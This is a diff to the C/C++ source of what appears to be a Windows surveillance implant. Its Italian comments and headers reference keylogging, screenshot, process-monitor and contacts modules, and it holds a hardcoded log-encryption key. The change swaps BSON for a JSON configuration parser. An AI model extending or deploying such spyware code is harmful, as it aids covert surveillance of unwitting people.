@@ -44,8 +44,6 @@
 #include <time.h>
 #include "sha1.h"
 #include "status_log.h"
-#include "bson.h"
-
 
 #pragma bss_seg("shared")
 BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
@@ -91,6 +89,7 @@ void HM_U2A(char *buffer);
 void LockConfFile();
 void UnlockConfFile();
 
+#include "JSON\JSON.h"
 #include "HM_ProcessMonitors.h" // XXX da modificare
 #include "HM_KeyLog.h" // XXX da modificare
 #include "HM_SnapShot.h" // XXX da modificare
@@ -110,7 +109,6 @@ void UnlockConfFile();
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
 #include "HM_Contacts.h" // XXX da modificare
-using namespace bson;
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
 BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
@@ -2028,6 +2026,31 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	return conf_memory_clear;
 }
 
+typedef void (WINAPI *conf_callback_t)(JSONObject);
+BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
+{
+	JSONValue *value;
+	JSONObject root;
+
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+
+	if (root.find(section) != root.end() && root[section]->IsArray()) {
+		JSONArray jarray = root[section]->AsArray();
+		for (unsigned int i = 0; i < jarray.size(); i++) {
+			if (jarray[i]->IsObject()) 
+				call_back(jarray[i]->AsObject());
+		}
+	}
+	delete value;
+	return TRUE;
+}
 
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
